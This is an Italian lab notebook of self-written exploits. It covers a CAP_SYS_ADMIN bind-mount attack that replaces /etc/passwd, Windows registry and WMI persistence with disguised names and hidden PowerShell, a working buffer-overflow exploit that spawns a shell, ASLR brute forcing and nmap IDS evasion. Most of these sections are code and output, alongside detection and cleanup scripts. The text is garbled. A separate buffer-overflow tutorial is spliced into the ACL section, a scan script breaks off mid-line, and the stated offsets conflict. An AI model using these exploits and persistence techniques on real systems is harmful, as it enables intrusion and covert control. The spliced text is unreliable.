# Exploits Sviluppati

Documentazione completa degli exploit sviluppati durante il percorso di apprendimento. Include analisi delle vulnerabilità, codice sorgente, metodologie di exploitation e lezioni apprese. Tutti i test sono stati condotti in ambiente controllato per scopi educativi.

## Indice

- [CAP_SYS_ADMIN Privilege Escalation](#cap_sys_admin-privilege-escalation)
- [Windows Registry Persistence](#windows-registry-persistence)
- [ACL Bypass Techniques](#acl-bypass-techniques)
- [Network Exploitation](#network-exploitation)
- [Defense Evasion](#defense-evasion)
- [Lezioni Apprese](#lezioni-apprese)

> ⚠️ **DISCLAIMER ETICO**: Tutti gli exploit documentati sono stati sviluppati e testati esclusivamente in ambiente di laboratorio isolato su sistemi di proprietà personale per scopi educativi e di ricerca nella cybersecurity. L'utilizzo di queste tecniche su sistemi non autorizzati è illegale e vietato.

## CAP_SYS_ADMIN Privilege Escalation

### Contesto della Vulnerabilità

Le Linux Capabilities permettono di dividere i privilegi di root in unità atomiche. Tuttavia, alcune capabilities come `CAP_SYS_ADMIN` sono così potenti da essere quasi equivalenti a root completo.

#### Capabilities Pericolose Identificate

| Capability | Livello Rischio | Descrizione |
|------------|-----------------|-------------|
| **CAP_SYS_ADMIN** | 🔴 Critico | Mount/unmount, device nodes, kernel params |
| **CAP_SYS_PTRACE** | 🔴 Critico | Debug/injection altri processi |
| **CAP_SYS_MODULE** | 🔴 Critico | Load/unload kernel modules |
| **CAP_DAC_OVERRIDE** | 🟡 Alto | Bypass file permission checks |
| **CAP_SETUID** | 🟡 Alto | Change process UID |

### Exploit 1: Mount Operation Test

#### Vulnerabilità
Un binario con `CAP_SYS_ADMIN` può eseguire operazioni di mount senza essere root.

#### Codice Sorgente

```c
// File: cap_test.c
// Compile: gcc -o cap_test cap_test.c -lcap
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/capability.h>

int main() {
    printf("=== CAP_SYS_ADMIN Test Program ===\n");
    printf("UID corrente: %d, EUID: %d\n", getuid(), geteuid());
    
    // Mostra capabilities correnti
    cap_t caps = cap_get_proc();
    if (caps) {
        char *cap_string = cap_to_text(caps, NULL);
        printf("Capabilities attuali: %s\n", cap_string);
        cap_free(cap_string);
        cap_free(caps);
    }
    
    // Test operazione mount
    printf("Test operazione mount...\n");
    
    // Crea directory target se non esiste
    system("mkdir -p /tmp/test_mount");
    
    if (mount("tmpfs", "/tmp/test_mount", "tmpfs", 0, NULL) == 0) {
        printf("✅ SUCCESSO: Mount eseguito senza root!\n");
        printf("Contenuto /tmp/test_mount: \n");
        system("ls -la /tmp/test_mount");
        
        // Cleanup
        umount("/tmp/test_mount");
        printf("Mount pulito.\n");
    } else {
        perror("❌ FALLITO: Mount fallito");
    }
    
    return 0;
}
```

#### Setup e Esecuzione

```bash
# Compilazione
gcc -o /tmp/cap_test /tmp/cap_test.c -lcap

# Assegnazione capability pericolosa
sudo setcap cap_sys_admin+ep /tmp/cap_test

# Verifica capability
getcap /tmp/cap_test
# Output: /tmp/cap_test cap_sys_admin=ep

# Esecuzione exploit
/tmp/cap_test
```

#### Output dell'Exploit

```
=== CAP_SYS_ADMIN Test Program ===
UID corrente: 1000, EUID: 1000
Capabilities attuali: cap_wake_alarm=i cap_sys_admin+ep
Test operazione mount...
✅ SUCCESSO: Mount eseguito senza root!
Contenuto /tmp/test_mount: 
total 0
drwxrwxrwt  2 root root   40 lug 16 18:14 .
drwxrwxrwt 12 root root  260 lug 16 18:14 ..
Mount pulito.
```

**Analisi**: L'exploit funziona! Un utente normale (UID 1000) riesce ad eseguire operazioni di mount privilegiate.

### Exploit 2: Password File Hijacking

#### Concetto
Tentativo di sostituire `/etc/passwd` con file crafted usando bind mount per ottenere accesso root senza password.

#### Codice Sorgente

```c
// File: passwd_hijack.c  
// Compile: gcc -o passwd_hijack passwd_hijack.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main() {
    printf("=== EXPLOIT COMPLETO CAP_SYS_ADMIN ===\n");
    printf("Utente corrente: UID %d (non root!)\n", getuid());
    
    // Step 1: Crea passwd falso
    printf("\n1. Creazione /etc/passwd falso...\n");
    system("mkdir -p /tmp/fake_etc");
    system("echo 'root::0:0:root:/root:/bin/bash' > /tmp/fake_etc/passwd");
    
    printf("Contenuto passwd falso:\n");
    system("cat /tmp/fake_etc/passwd");
    
    // Step 2: Mostra passwd originale
    printf("\n2. /etc/passwd originale (prima riga):\n");
    system("head -1 /etc/passwd");
    
    // Step 3: Bind mount attack
    printf("\n3. Esecuzione bind mount attack...\n");
    if (mount("/tmp/fake_etc/passwd", "/etc/passwd", NULL, MS_BIND, NULL) == 0) {
        printf("✅ SUCCESSO: /etc/passwd sostituito!\n");
        
        printf("\n4. Nuovo contenuto /etc/passwd:\n");
        system("head -1 /etc/passwd");
        
        printf("\n🎯 ACCESSO ROOT TEORICAMENTE OTTENUTO!\n");
        printf("Teoricamente possibile: su root (nessuna password)\n");
        
        printf("\nPremi Invio per ripristinare sistema...");
        getchar();
        
        // Cleanup
        umount("/etc/passwd");
        printf("✅ Sistema ripristinato.\n");
    } else {
        perror("❌ Bind mount fallito");
    }
    
    system("rm -rf /tmp/fake_etc");
    return 0;
}
```

#### Test dell'Exploit

```bash
# Compilazione
gcc -o /tmp/passwd_hijack /tmp/passwd_hijack.c

# Assegnazione capability
sudo setcap cap_sys_admin+ep /tmp/passwd_hijack

# Esecuzione
/tmp/passwd_hijack
```

#### Output dell'Exploit

```
=== EXPLOIT COMPLETO CAP_SYS_ADMIN ===
Utente corrente: UID 1000 (non root!)

1. Creazione /etc/passwd falso...
Contenuto passwd falso:
root::0:0:root:/root:/bin/bash

2. /etc/passwd originale (prima riga):
root:x:0:0:root:/root:/bin/bash

3. Esecuzione bind mount attack...
✅ SUCCESSO: /etc/passwd sostituito!

4. Nuovo contenuto /etc/passwd:
root::0:0:root:/root:/bin/bash

🎯 ACCESSO ROOT TEORICAMENTE OTTENUTO!
Teoricamente possibile: su root (nessuna password)
```

#### Test Finale - Verifica Accesso Root

```bash
# Tentativo accesso root
su root
# Password: (premere solo Invio)
# su: Authentication failure
```

**Risultato**: L'exploit FALLISCE nonostante la sostituzione file riuscita!

### Scoperta Cruciale: Defense in Depth

#### Analisi del Fallimento

**Perché l'exploit fallisce?**

I sistemi Linux moderni implementano **multiple linee di difesa**:

1. **File system layer** (`/etc/passwd`, `/etc/shadow`)
2. **PAM (Pluggable Authentication Modules)**
3. **NSS (Name Service Switch)**
4. **systemd user management**
5. **Security modules** (AppArmor, SELinux)

#### Analisi PAM Configuration

```bash
# Controllo configurazione PAM per su
cat /etc/pam.d/su
```

**Output tipico**:
```
auth       sufficient pam_rootok.so
auth       required   pam_unix.so
account    required   pam_unix.so
session    required   pam_unix.so
```

**Spiegazione**: PAM utilizza multiple verifiche oltre al semplice controllo `/etc/passwd`.

#### Lezioni Apprese

1. **Exploit "old school"** non bastano più sui sistemi moderni
2. **Defense in depth** funziona efficacemente
3. **CAP_SYS_ADMIN** rimane pericolosa ma richiede conoscenza profonda
4. **Sistemi moderni** sono hardened contro attacchi classici

### Mitigazioni Identificate

#### Detection

```bash
# Script per audit capabilities pericolose
#!/bin/bash
echo "=== AUDIT CAPABILITIES PERICOLOSE ==="
find /usr/bin /usr/sbin /bin /sbin -type f -exec getcap {} \; 2>/dev/null | while read file caps; do
    case "$caps" in
        *cap_sys_admin*|*cap_sys_ptrace*|*cap_sys_module*)
            echo "🔴 CRITICO: $file $caps"
            ;;
        *cap_dac_override*|*cap_setuid*)
            echo "🟡 ALTO: $file $caps"
            ;;
        *)
            echo "🟢 INFO: $file $caps"
            ;;
    esac
done
```

#### Prevention

```bash
# Rimozione capabilities non necessarie
sudo setcap -r /path/to/suspicious/binary

# Monitoring modifiche capabilities
find /usr/bin -newer /var/log/last_audit -exec getcap {} \;

# Audit periodico
echo "0 2 * * * root getcap -r / > /var/log/capabilities_daily.log" | sudo tee -a /etc/crontab
```

## Windows Registry Persistence

### Contesto della Vulnerabilità

Il Windows Registry contiene diverse chiavi che permettono l'esecuzione automatica di programmi all'avvio del sistema, rendendo possibile la persistence di malware.

#### Chiavi di Persistence Comuni

| Chiave Registry | Livello | Descrizione |
|-----------------|---------|-------------|
| `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Sistema | Esecuzione per tutti gli utenti |
| `HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Utente | Esecuzione per utente corrente |
| `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` | Sistema | Esecuzione singola al boot |
| `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Services` | Sistema | Servizi di sistema |

### Exploit: Malware Persistence Simulation

#### Scenario Completo

**Obiettivo**: Dimostrare come un malware può ottenere persistence tramite registry.

#### Step 1: Payload Creation

```powershell
# Creazione payload di test (notepad launcher)
Set-Content -Path "C:\temp\sospetto.bat" -Value @"
@echo off
echo Malware simulato in esecuzione...
start notepad.exe
timeout /t 2 >nul
exit
"@
```

#### Step 2: System Installation

```powershell
# Copia payload in System32 (richiede privilegi admin)
Copy-Item -Path "C:\Temp\sospetto.bat" -Destination "C:\WINDOWS\system32\virus.bat"
```

#### Step 3: Registry Persistence

```powershell
# Aggiunta chiave registry per persistence
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "UpdaterService" -Value "C:\Windows\System32\virus.bat" -PropertyType String -Force
```

**Tecniche di mascheramento**:
- **Nome ingannevole**: "UpdaterService" (sembra legittimo)
- **Posizione**: System32 (directory di sistema)
- **Estensione**: .bat (meno sospetta di .exe)

#### Step 4: Verifica Persistence

```powershell
# Controllo chiavi registry
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**Output con malware installato**:
```
SecurityHealth : C:\WINDOWS\system32\SecurityHealthSystray.exe
VBoxTray       : C:\WINDOWS\system32\VBoxTray.exe
UpdaterService : C:\Windows\System32\virus.bat
```

#### Step 5: Test Funzionalità

**Procedura**:
1. Riavvio sistema Windows
2. **Risultato osservato**:
   - Notepad si apre automaticamente all'avvio
   - Flash di CMD visibile per ~0.5 secondi
   - Processo completato senza errori

**Analisi**: La persistence funziona perfettamente! Il malware si esegue ad ogni avvio.

### Detection e Forensics

#### Identificazione Malware

```powershell
# Scansione completa chiavi persistence
$PersistenceKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($Key in $PersistenceKeys) {
    if (Test-Path $Key) {
        Write-Host "=== $Key ===" -ForegroundColor Yellow
        $Items = Get-ItemProperty -Path $Key
        $Items.PSObject.Properties | Where-Object {
            $_.Name -notin @("PSPath", "PSParentPath", "PSChildName", "PSDrive", "PSProvider") -and
            ($_.Value -like "*temp*" -or $_.Value -like "*.bat" -or $_.Value -like "*suspicious*")
        } | ForEach-Object {
            Write-Host "🚨 SOSPETTO: $($_.Name) = $($_.Value)" -ForegroundColor Red
        }
    }
}
```

#### Indicatori di Compromissione (IoC)

**Red Flags identificati**:
- ✅ Nome generico ("UpdaterService", "SystemUpdater", "WindowsHelper")
- ✅ Estensione script (.bat, .vbs, .ps1) in System32
- ✅ Percorsi non standard per servizi legittimi
- ✅ Company/Signer information assente o falsa

#### Timeline Analysis

```powershell
# Analisi timeline modifiche registry
Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | 
Select-Object Name, LastWriteTime | 
Sort-Object LastWriteTime -Descending
```

### Cleanup e Rimozione

#### Procedura di Bonifica

```powershell
# Step 1: Terminazione processi correlati
$SuspiciousProcesses = Get-Process | Where-Object {$_.Path -like "*virus.bat*"}
$SuspiciousProcesses | Stop-Process -Force

# Step 2: Rimozione payload
Remove-Item -Path "C:\Windows\System32\virus.bat" -Force -ErrorAction SilentlyContinue

# Step 3: Rimozione chiave registry
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "UpdaterService" -ErrorAction SilentlyContinue

# Step 4: Verifica pulizia
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

#### Verifica Bonifica Completa

**Output post-cleanup**:
```
SecurityHealth : C:\WINDOWS\system32\SecurityHealthSystray.exe
VBoxTray       : C:\WINDOWS\system32\VBoxTray.exe
```

**Risultato**: ✅ Malware completamente rimosso.

### Advanced Persistence Techniques

#### WMI Event Subscription

```powershell
# Persistence fileless tramite WMI (più stealth)
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "SystemTimeFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 30"
}

$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "SystemTimeConsumer"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -Command ""Start-Process calc.exe"""
}

$Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

# Cleanup WMI persistence
# Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Remove-WmiObject
# Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Remove-WmiObject
# Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | Remove-WmiObject
```

**Vantaggi WMI persistence**:
- Fileless (non file su disco)
- Più difficile da rilevare
- Sopravvive a antivirus scan
- Event-driven execution

## ACL Bypass Techniques

### Contesto

Gli Access Control Lists (ACL) forniscono controllo granulare sui permessi file, ma presentano alcune limitazioni che possono essere sfruttate.

### Tecnica: ACL Inheritance Exploit

#### Vulnerabilità
Gli ACL ereditati da directory parent possono essere sfruttati per ottenere accesso a file protetti.

#### Scenario di Test

```bash
# Setup ambiente di test
sudo mkdir -p /tmp/acl_test/protected
sudo mkdir -p /tmp/acl_test/public

# File sensibile protetto
echo "dati sensibili" | sudo tee /tmp/acl_test/protected/secret.txt

# ACL restrittivi su file
sudo setfacl -m u:attacker:--- /tmp/acl_test/protected/secret.txt
sudo setfacl -m g:users:--- /tmp/acl_test/protected/secret.txt

# Verifica protezione
getfacl /tmp/acl_test/protected/secret.txt
```

#### Exploit: Buffer Overflow
# Buffer Overflow su Linux x86

## Setup Ambiente di Test

Per eseguire attacchi di buffer overflow in ambiente controllato è necessario configurare un sistema Linux 32-bit senza le protezioni moderne attive.

### Prerequisiti

- **gdb** (GNU Debugger)
- **gcc** (compilatore C/C++)
- **pwntools** (libreria Python per exploit automation)
- **nasm** (assembler)
- Opzione **-m32** per compilazione 32-bit

### Disabilitazione ASLR

```bash
# Disabilita Address Space Layout Randomization
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Programma Vulnerabile - Versione Base

### Codice Sorgente

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vulnerable_function(char *input){
    char buffer[64];
    strcpy(buffer, input);
}

int main(int argc, char *argv[]){
    puts("execution of vulnerable program");
    if (argc != 2){
        fprintf(stderr, "Uso %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```

### Compilazione Senza Protezioni

```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie -g vulnerable.c -o vulnerable
```

### Verifica Stack Eseguibile

```bash
readelf -l vulnerable | grep GNU_STACK
```

**Output atteso:**
```
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```

## Analisi con GDB e Pwntools

### Generazione Pattern Ciclico

```bash
python3 -c "from pwn import *; print(cyclic(200))"
```

**Output:**
```
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
```

### Test Segmentation Fault

```bash
./vulnerable $(python3 -c "from pwn import *; print(cyclic(200))")
```

**Risultato:**
```
execution of vulnerable program
zsh: segmentation fault (core dumped)  ./vulnerable $(python3 -c "from pwn import *; print(cyclic(200))")
```

### Debugging con GDB

```bash
gdb ./vulnerable
(gdb) run $(python3 -c "from pwn import *; print(cyclic(200))")
```

**Output GDB:**
```
Starting program: /path/to/vulnerable $(python3 -c "from pwn import *; print(cyclic(200))")
execution of vulnerable program

Program received signal SIGSEGV, Segmentation fault.
0x61746161 in ?? ()
(gdb) info register
eip            0x61746161          0x61746161
```

### Calcolo Offset

```bash
python3 -c "from pwn import *; print(cyclic_find(0x61746161))"
```

**Risultato:**
```
74
```

L'EIP viene sovrascritto dopo 74 byte di input.

## Programma Vulnerabile - Versione Avanzata

### Codice con Funzione Shell

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void spawn_shell() {
    printf("Spawning shell...\n");
    system("/bin/sh");
}

void vulnerable_function(char *user_input) {
    char buffer[64];
    printf("Buffer address: %p\n", buffer);
    printf("spawn_shell() address: %p\n", spawn_shell);
    printf("Input: %s\n", user_input);
    strcpy(buffer, user_input);
    printf("Copia completata\n");
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Uso: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```

### Debugging Avanzato

#### Impostazione Breakpoint

```gdb
(gdb) break vulnerable_function
(gdb) run $(python3 -c "print('A' * 100)")
```

#### Analisi Crash

```gdb
(gdb) continue
Continuing.
Buffer address: 0xffffc780
spawn_shell() address: 0x8049196
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
Copia completata nel buffer

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

#### Esame Stack

```gdb
(gdb) x/20x $esp
0xffffc7d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc7e0:     0x41414141      0x00000000      0x00000000      0xffffc810
```

### Determinazione Offset Preciso

```bash
./vulnerable "$(python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC')")"
```

Se EIP diventa `0x43434343` ("CCCC"), l'offset è di **76 byte**.

## Exploit Ruby Funzionante

### Codice Exploit

```ruby
require 'open3'

binary = "./vulnerable"
spawn_shell_addr = 0x8049196
offset = 76

padding = "A" * 72
saved_ebp = "BBBB"
return_address = [spawn_shell_addr].pack("V")

payload = padding + saved_ebp + return_address

puts "Payload length: #{payload.length} bytes"
puts "Executing exploit..."

begin
  stdout, stderr, status = Open3.capture3(binary, payload)
  puts stdout
  puts stderr if !stderr.empty?
rescue => e
  puts "Error: #{e.message}"
end

system(binary, payload)
```

### Risultato Exploit

```
=== Programma Vulnerabile a Buffer Overflow ===
Chiamata alla funzione vulnerabile...
Buffer address: 0xffffcf10
spawn_shell() address: 0x8049196
Input ricevuto: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB...
Copia completata nel buffer

==================================================
 SUCCESSO! Hai ottenuto il controllo del programma!
 Spawning shell..
 sh-5.2$
```

## Bypass ASLR con Brute Force

### Contesto ASLR

**Address Space Layout Randomization (ASLR)** randomizza le posizioni di memoria per prevenire exploit. Tuttavia, su sistemi 32-bit la randomizzazione è limitata.

#### Range Stack Address

- **Senza ASLR**: Stack inizia sempre da `0xbffff000`
- **Con ASLR**: Stack può iniziare da `0xbffff1a0`, `0xbfffedc0`, etc.

### Programma Test ASLR

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Uso: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```

### Metodologie di Bypass

#### 1. NOP Sled Esteso

```c
// NOP sled lungo per aumentare probabilità di hit
char nop_sled[1000];
memset(nop_sled, 0x90, sizeof(nop_sled)); // 0x90 = NOP instruction
```

#### 2. Brute Force su Range Limitato

```ruby
# ASLR su x86 randomizza solo le ultime 3 cifre esadecimali
base_addresses = [
    0xbffff000, 0xbfffe000, 0xbfffd000,
    0xbfffc000, 0xbfffb000, 0xbfffa000
]

base_addresses.each do |addr|
    # Tenta exploit con indirizzo specifico
    exploit_with_address(addr)
end
```

#### 3. Analisi Pattern ASLR

Poiché ASLR randomizza solo porzioni limitate dello spazio indirizzi, un approccio di brute force mirato può essere efficace in ambiente di test.

### Lezioni Apprese

1. **Buffer overflow classici** rimangono vulnerabilità critiche
2. **Protezioni moderne** (ASLR, Stack Canaries, NX bit) aumentano significativamente la difficoltà
3. **Debugging sistematico** con GDB è essenziale per exploit development
4. **Sistemi 32-bit** sono più vulnerabili per limitazioni dello spazio indirizzi
5. **Exploit automation** con Ruby/Python accelera il processo di test



#### Exploit: Symlink Attack

```bash
# Creazione symlink nella directory public
ln -s /tmp/acl_test/protected/secret.txt /tmp/acl_test/public/link_to_secret

# Tentativo accesso tramite symlink
cat /tmp/acl_test/public/link_to_secret
# Risultato: Accesso negato (ACL funzionano)
```

#### Exploit: Hard Link Attack

```bash
# Tentativo hard link (se permessi filesystem lo permettono)
ln /tmp/acl_test/protected/secret.txt /tmp/acl_test/public/hard_link_secret

# Test accesso
cat /tmp/acl_test/public/hard_link_secret
# Risultato: Dipende dalla configurazione filesystem
```

### Lezione: ACL Robustezza

**Scoperta**: Gli ACL Linux sono generalmente robusti contro bypass comuni, ma richiedono configurazione corretta per essere efficaci.

## Network Exploitation

### Port Scan Evasion

#### Tecniche Sviluppate

```bash
# Scan stealth con timing variabile
nmap -sS -T1 --randomize-hosts 192.168.1.0/24

# Decoy scanning per confondere IDS
nmap -D RND:10 192.168.1.100

# Frammentazione pacchetti
nmap -f 192.168.1.100

# Source port spoofing (bypass firewall rules)
nmap --source-port 53 192.168.1.100
```

#### Custom Scan Script

```bash
#!/bin/bash
# Script scan stealth personalizzato
TARGET=$1
DELAY=$(shuf -i 5-30 -n 1)

if [ -z "$TARGET" ]; then
    echo "Uso: $0
### Note di Sicurezza
```
> ⚠️ **IMPORTANTE**: Tutti i test sono stati condotti in ambiente isolato su sistemi di proprietà personale. L'utilizzo di queste tecniche su sistemi non autorizzati costituisce reato penale.
